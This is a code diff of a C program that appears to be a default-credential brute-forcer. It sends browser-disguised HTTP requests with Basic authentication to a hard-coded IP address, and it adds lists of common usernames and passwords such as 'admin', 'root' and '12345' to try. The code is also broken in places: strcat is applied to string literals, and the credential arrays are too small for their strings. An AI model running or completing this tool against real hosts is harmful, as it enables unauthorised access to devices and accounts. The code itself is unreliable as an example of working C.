@@ -46,13 +46,43 @@ char* base64_encode(char* plain) {
 }
 
 
-int main() {
-	int sockfd = 0, n = 0, connPort = 80;
-	struct sockaddr_in serv_addr;
-	char buff[256], connAddr[] = "172.238.141.253";
+int main(int argc, char* argv[]) {
+	int sockfd = 0, 
+		n = 0, 
+		connPort = 80;
+	struct sockaddr_in 
+		serv_addr;
+	char buff[256], 
+		connAddr[] = "172.238.141.253";
 
-	char headers[] = strcat("GET / HTTP/1.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: utf-8;q=0.7,*;q=0.7\nKeep-Alive: 300\nConnection: keep-alive\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nHost: ", connAddr);
-	char headers_auth[] = strcat("\nAuthorization: Basic ", base64_encode("admin:admin"));
+	// HTTP Headers
+	char headers[] = "",
+		headers_get[] = "GET / HTTP/1.1\n",
+		headers_acceptdata[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n",
+		headers_acceptlang[] = "Accept-Language: en-us,en;q=0.5\n",
+		headers_acceptdefl[] = "Accept-Encoding: gzip,deflate\n",
+		headers_acceptencp[] = "Accept-Charset: utf-8;q=0.7,*;q=0.7\n",
+		headers_connection[] = "Connection: keep-alive\n",
+		headers_keepalive[] = "Keep-Alive: 300\n",
+		headers_cachectrl[] = "Cache-Control: max-age=0\n",
+		headers_uprginsecreq[] = "Upgrade-Insecure-Requests: 1\n",
+		headers_useragent[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\n",
+		headers_host[] = "Host: ", //insert connaddr
+		headers_auth[] = "\nAuthorization: Basic "; //insert base64
+	
+	// Credentials
+	char users[5][3] = {
+		"admin",
+		"root",
+		"Admin"};
+	char passwords[9][6] = {
+		"admin",
+		"password",
+		"1234",
+		"root",
+		"Admin",
+		"12345"};
+	
 
 	memset(buff, '0', sizeof(buff));
 
